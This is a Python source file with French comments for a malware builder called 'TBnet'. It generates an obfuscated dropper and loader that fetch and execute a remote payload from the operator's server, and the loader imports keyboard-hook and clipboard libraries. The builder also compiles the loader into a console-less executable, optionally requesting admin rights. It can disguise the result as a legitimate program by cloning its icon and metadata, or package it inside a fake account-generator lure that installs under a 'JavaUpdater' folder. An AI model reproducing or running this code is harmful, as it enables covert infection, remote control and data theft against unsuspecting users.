import argparse
import subprocess
import os
import shutil
import base64
import zlib
import marshal
import sys
from getpass import getpass
from pathlib import Path
from hashlib import sha256
import random
import string

image = """ _______  ______                __
|_     _||   __ \.-----..-----.|  |_
  |   |  |   __ <|     ||  -__||   _|
  |___|  |______/|__|__||_____||____|
"""
print(image)

def getString(length):
    """Générer une chaîne aléatoire de longueur fixe"""
    str = string.ascii_lowercase
    return ''.join(random.choice(str) for i in range(length))

def InsertRandomString(script):
    cible = "<RANDOMSTRING>"
    new_lignes = []
    try:
        fichier = open(script, "r")
        lignes = fichier.readlines()
        for ligne in lignes:
            rdm_str = getString(random.randint(25, 45))
            new_ligne = ligne.replace(cible, rdm_str)
            new_lignes.append(new_ligne)
        fichier.close()
        fichier = open(script, "w")
        for ligne in new_lignes:
            fichier.write(ligne)
        return True
    except Exception as e:
        print(e)
        return False

parser = argparse.ArgumentParser(description='TBnet Help Menu')
parser.add_argument('--host', 
                    type=str, 
                    required=True, 
                    dest='host',
                    help='Ip du Server')
parser.add_argument('--port', 
                    type=int, 
                    required=False, 
                    dest='port',
                    default=4444,
                    help='Port du Server')
parser.add_argument('--name',
                    type=str, 
                    required=False, 
                    dest='name', 
                    default=getString(5),
                    help='Définir nom du fichier')
parser.add_argument('--persistance',
                    type=bool,
                    required=False,
                    dest='persistance',
                    default=False,
                    help='Active la persistance automatique')
parser.add_argument('--freeze',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='freeze',
                    default=False,
                    help='compile le client dans un executable')
parser.add_argument('--hide-in-exe',
                    type=str,
                    required=False,
                    dest='path_exe',
                    default='',
                    help='Cache un payload dans un exe sain')
parser.add_argument('--obf',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='obf',
                    default=False,
                    help='obfusque le code python')
parser.add_argument('--icon',
                    type=str,
                    required=False,
                    dest='icon',
                    default='',
                    help='Ajoute une icon à l\'éxecutable')
parser.add_argument('--admin',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='adm',
                    default=False,
                    help='Demande une autorisation Administrateur au lancement du programme')
parser.add_argument('--fake-gen',
                    type=str,
                    required=False,
                    dest='name_fake_gen',
                    default='',
                    help='Génere un faux générateur de compte')
args = parser.parse_args()

class GenClient:

    pathDirFichier = "./code/"
    pathDirOutput = "./output/"
    pathDirHttp = "./http/"
    appdata = os.path.expandvars("%AppData%").replace("\Roaming","")

    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon, path_exe, adm, name_fake_gen):
        fin_dropeur = """)))))
        except Exception as e:
            print(str(e))
            time.sleep(5*60)"""
        debut_loader = "import base64,sys,zlib,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid,time,os,asyncio,pproxy,paramiko;from win32com.makegw.makegwparse import*;from ctypes import*;from urllib import request;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]("
        fin_loader = ")))"
        # definir url du payload
        url = "\"http://" + ip + ":" + str(port + 1) + "/" + name + ".pyw\""
        # creer les dossier outpu et http si il n'éxiste pas
        if not os.path.exists(self.pathDirOutput):
            os.makedirs(self.pathDirOutput)
        if not os.path.exists(self.pathDirHttp):
            os.makedirs(self.pathDirHttp)
        # recuperer credential ssh
        username_SSH, password_SSH = self.ReturnCredSSH()
        # ecrire le payload dans http
        fichier = open(self.pathDirHttp + name + ".pyw", "w")
        fichier.write(self.ReturnFichier("payload1.txt"))
        fichier.write("\n    host = \"{}\"\n    port = {}\n    user_SSH = \"{}\"\n    password_SSH = \"{}\"\n    name_proc = \"{}\"\n".format(ip, str(port), username_SSH, password_SSH, "load_" + name + ".exe"))
        fichier.write(self.ReturnFichier("payload2.txt"))
        fichier.close()
        # Ajouté les RandomString
        InsertRandomString(self.pathDirHttp + name + ".pyw")
        # obfusqué le payload
        if obf:
            os.system("pyminifier --obfuscate-classes -o " + self.pathDirHttp + name + ".pyw" + " " + self.pathDirHttp + name + ".pyw")
        # ecrire le dropeur dans output
        fichier = open(self.pathDirOutput + "drop_" + name + ".pyw", "w")
        ## import sys,zlib,base64,marshal,json,urllib
        dropper = self.ReturnFichier("dropeur.txt") + "{}".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(url),2))))) + fin_dropeur
        fichier.write(dropper)
        fichier.close()
        # obfusqué le droppeur
        if obf:
            os.system("pyminifier --obfuscate-classes -o " + self.pathDirOutput + "drop_" + name + ".pyw" + " " + self.pathDirOutput + "drop_" + name + ".pyw")
        # ecrire le loader dans output
        fichier = open(self.pathDirOutput + "load_" + name + ".pyw", "w")
        drop_txt = str(base64.b64encode(open(self.pathDirOutput + "drop_" + name + ".pyw", "r").read().encode('utf-8')))[1:]
        fichier.write(debut_loader + drop_txt + fin_loader)
        fichier.close()
        if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
            os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
        
        # py -m nuitka --onefile --include-data-file="C:\Users\theoc\AppData\Local\Programs\Python\Python37\Lib\site-packages\pyHook\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd" --windows-disable-console payload.exe
        # si l'option hide in exe est choisi
        if not path_exe == "": ###--include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\=data\\pyHook\\_cpyHook.cp37-win_amd64.pyd\"
            ## Complier le loader
            cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
            os.system(cmd)
            shutil.copyfile("load_" + name + ".exe", self.pathDirHttp + name + ".exe")
            if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
            if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "load_" + name + ".pyw")
            if os.path.exists("load_" + name + ".exe"):
                os.remove("load_" + name + ".exe")
            shutil.rmtree("load_" + name + ".dist/")
            shutil.rmtree("load_" + name + ".build/")
            shutil.rmtree("load_" + name + ".onefile-build/")


            ## Récupérer l'icon du fichier safe
            #path_ico = self.PngToIcon(self.ExtractIcon(path_exe))

            name_payload = os.path.basename(self.pathDirHttp + name + ".exe")
            name_exe = os.path.basename(path_exe)
            url_payload = "\"http://" + ip + ":" + str(port + 1) + "/" + name_payload + "\""
            url_safe = "\"http://" + ip + ":" + str(port + 1) + "/" + name_exe + "\""
            # host le fichier safe
            shutil.copyfile(path_exe, self.pathDirHttp + name_exe)
            loader_hide_file = """import os
import subprocess
import urllib.request
import psutil 
pathAppData = os.getenv('APPDATA')
pathDir = pathAppData + "\\\\JavaUpdater\\\\"
if not os.path.exists(pathDir):
    os.makedirs(pathDir)
if not os.path.exists(pathDir + "{}"):
    urllib.request.urlretrieve({},pathDir + "{}")
if not "{}" in (p.name() for p in psutil.process_iter()):
    cmd = "start " + pathDir + "{}"
    resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                            stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
if not os.path.exists(pathDir + "{}"):
    urllib.request.urlretrieve({},pathDir + "{}")
cmd = "start " + pathDir + "{}"
resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                          stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, name_payload, name_exe, url_safe, name_exe, name_exe)

            name_exe_no_ext, ext_exe  = os.path.splitext(os.path.basename(path_exe))
            fichier = open(self.pathDirOutput + name_exe_no_ext + ".pyw", "w")
            fichier.write(loader_hide_file)
            fichier.close()
            ## Compiler le faux programmes
            try:
                fileVersionNumber, companyName, fileDescription = self.ExtractInfo(path_exe)
            except:
                fileVersionNumber = "1.0"
                companyName = "Test"
                fileDescription = "Fichier test"
            ##--windows-company-name=  --windows-file-version=  --windows-file-description=
            cmd = "py -m nuitka --windows-icon-from-exe={} --windows-file-version=\"{}\" --windows-company-name=\"{}\" --windows-file-description=\"{}\" --windows-disable-console --windows-uac-admin --onefile {}".format(path_exe, fileVersionNumber, companyName, fileDescription, self.pathDirOutput + name_exe_no_ext + ".pyw")
            os.system(cmd)
            shutil.copyfile(name_exe_no_ext + ".exe", self.pathDirOutput + name_exe_no_ext + ".exe")
            if os.path.exists(self.pathDirOutput + name_exe_no_ext + ".pyw"):
                os.remove(self.pathDirOutput + name_exe_no_ext + ".pyw")
            if os.path.exists(name_exe_no_ext + ".exe"):
                os.remove(name_exe_no_ext + ".exe")
            shutil.rmtree(name_exe_no_ext + ".dist/")
            shutil.rmtree(name_exe_no_ext + ".build/")
            shutil.rmtree(name_exe_no_ext + ".onefile-build/")

            ## & '.\exiftool(-k).exe' C:\Users\theoc\Desktop\putty.exe
            """
            File Version Number
            Company Name
            FileDescription
            """
        # si l'options freeze est choisi
        if freeze: ### --onefile ##--windows-onefile-tempdir-spec=\"'%APPDATA%\\onefile_%PID%_%TIME%'\"
            ## Complier le loader
            cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile".format(self.appdata)
            if adm:
                cmd = cmd + " --windows-uac-admin"
            #if not icon == "":
                #cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
            cmd = cmd + " {}".format(self.pathDirOutput + "load_" + name + ".pyw")
            os.system(cmd)
            print("Compilation terminer")
            print("Nettoyage des fichier temporaire")
            # netoyyer fichier temporaire
            shutil.copyfile("load_" + name + ".exe", self.pathDirOutput + name + ".exe")
            if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
            if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "load_" + name + ".pyw")
            if os.path.exists("load_" + name + ".exe"):
                os.remove("load_" + name + ".exe")
            shutil.rmtree("load_" + name + ".dist/")
            shutil.rmtree("load_" + name + ".build/")
            shutil.rmtree("load_" + name + ".onefile-build/")

            print("Client executable prêt : output/" + name + ".exe")
            return True
        else:
            print("Client prêt : output/" + "load_" + name + ".pyw")
        # si l'options fake-gen est choisi
        if not name_fake_gen == "":
            ## Complier le loader
            cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile".format(self.appdata)
            if adm:
                cmd = cmd + " --windows-uac-admin"
            #if not icon == "":
                #cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
            cmd = cmd + " {}".format(self.pathDirOutput + "load_" + name + ".pyw")
            os.system(cmd)
            print("Compilation terminer")
            print("Nettoyage des fichier temporaire")
            # netoyyer fichier temporaire
            shutil.copyfile("load_" + name + ".exe", self.pathDirHttp + name + ".exe")
            if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
            if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
                os.remove(self.pathDirOutput + "load_" + name + ".pyw")
            if os.path.exists("load_" + name + ".exe"):
                os.remove("load_" + name + ".exe")
            shutil.rmtree("load_" + name + ".dist/")
            shutil.rmtree("load_" + name + ".build/")
            shutil.rmtree("load_" + name + ".onefile-build/")

            ## Ecrire le generateur
            gen_name = name_fake_gen + "Generator.pyw"
            
            self.EcrireFichier(["""from tkinter import *
import random
import string
from tkinter import ttk
import threading
import ctypes
import inspect""", "\nname_app = \"{}\"".format(name_fake_gen), self.ReturnFichier("gen.txt")]\
    , self.pathDirOutput + gen_name)
            ## Compile et host le générateur 
            self.Compiler(self.pathDirOutput + gen_name, self.pathDirHttp, tkinter=True, pyhook=False)
            name_payload = os.path.basename(self.pathDirHttp + name + ".exe")
            name_exe = os.path.basename(self.pathDirOutput + gen_name)
            name_exe_no_ext, ext_exe  = os.path.splitext(name_exe)
            name_exe_final = name_exe_no_ext + ".exe"
            url_payload = "\"http://" + ip + ":" + str(port + 1) + "/" + name_payload + "\""
            url_safe = "\"http://" + ip + ":" + str(port + 1) + "/" + name_exe_final + "\""
            loader_hide_file = """import os
import subprocess
import urllib.request
import psutil 
pathAppData = os.getenv('APPDATA')
pathDir = pathAppData + "\\\\JavaUpdater\\\\"
if not os.path.exists(pathDir):
    os.makedirs(pathDir)
if not os.path.exists(pathDir + "{}"):
    urllib.request.urlretrieve({},pathDir + "{}")
if not "{}" in (p.name() for p in psutil.process_iter()):
    cmd = "start " + pathDir + "{}"
    resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                            stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
if not os.path.exists(pathDir + "{}"):
    urllib.request.urlretrieve({},pathDir + "{}")
cmd = "start " + pathDir + "{}"
resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                          stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, name_payload, name_exe_final, url_safe, name_exe_final, name_exe_final)
            name_exe_no_ext, ext_exe  = os.path.splitext(name_exe)
            self.EcrireFichier([loader_hide_file], self.pathDirOutput + name_exe_no_ext + ".pyw")
            if adm:
                self.Compiler(self.pathDirOutput + name_exe_no_ext + ".pyw", self.pathDirOutput, pyhook=False, adm=True)
            else:
                self.Compiler(self.pathDirOutput + name_exe_no_ext + ".pyw", self.pathDirOutput, pyhook=False)
            if os.path.exists(self.pathDirOutput + name_exe_no_ext + ".pyw"):
                os.remove(self.pathDirOutput + name_exe_no_ext + ".pyw")
            print("Payload pret : {}".format(self.pathDirOutput + name_exe_no_ext + ".exe"))
            return True
            

    def ReturnFichier(self, nom_fichier):
        fichier = open(self.pathDirFichier + nom_fichier, "r")
        text = fichier.read()
        fichier.close()
        return text

    def ReturnCredSSH(self):
        fichier = open("credential.txt", "r")
        text = fichier.read()
        fichier.close()
        username, password = text.split(":")
        return username, password

    def ExtractInfo(self, file):
        
        import exiftool

        with exiftool.ExifTool(self.appdata + "\\Local\\Programs\\Python\\Python37\\exiftool(-k).exe") as et:
            print("Lancement de ExifTool")
            metadata = et.get_metadata(file)
            fileVersionNumber = metadata["EXE:FileVersionNumber"]
            companyName = metadata["EXE:CompanyName"]
            fileDescription = metadata["EXE:FileDescription"]
            print("{} {} {}".format(fileVersionNumber, companyName, fileDescription))
            return fileVersionNumber, companyName, fileDescription
    
    def Compiler(self, path_fichier, dir_output, adm=False, pyhook=True, tkinter=False, icon=""):
        """Compile un Fichier python avec Nuitka"""
        name_fichier = os.path.basename(path_fichier)
        name_fichier_no_ext, ext  = os.path.splitext(name_fichier)
        name_fichier_final = name_fichier_no_ext + ".exe"
        cmd = "py -m nuitka --follow-imports --windows-disable-console --onefile "
        if pyhook:
            cmd = cmd + " --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\"".format(self.appdata)
        if adm:
            cmd = cmd + " --windows-uac-admin"
        if tkinter:
            cmd = cmd + " --plugin-enable=tk-inter"
        
        #if not icon == "":
            #cmd = cmd + " --windows-uac-admin"
        
        cmd = cmd + " {}".format(path_fichier)
        os.system(cmd)
        print("Compilation terminer")
        shutil.copyfile(name_fichier_final, dir_output + name_fichier_final)

        if os.path.exists(name_fichier_no_ext + ".exe"):
            os.remove(name_fichier_no_ext + ".exe")

        shutil.rmtree(name_fichier_no_ext + ".dist/")
        shutil.rmtree(name_fichier_no_ext + ".build/")
        shutil.rmtree(name_fichier_no_ext + ".onefile-build/")
    
    def EcrireFichier(self, list_code, name_fichier):
        fichier = open(name_fichier, "w")
        for code in list_code:
            fichier.write(code)
        fichier.close()


if args.freeze == False and args.path_exe == "" and args.name_fake_gen == "" and args.adm == True:
    print("Options incompatible")
    os._exit(0)

if args.freeze == True and not args.path_exe == "":
    print("Options incompatible")
    os._exit(0)

if args.freeze == True and not args.name_fake_gen == "":
    print("Options incompatible")
    os._exit(0)

if not args.name_fake_gen == "" and not args.path_exe == "":
    print("Options incompatible")
    os._exit(0)

GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon, args.path_exe, args.adm, args.name_fake_gen)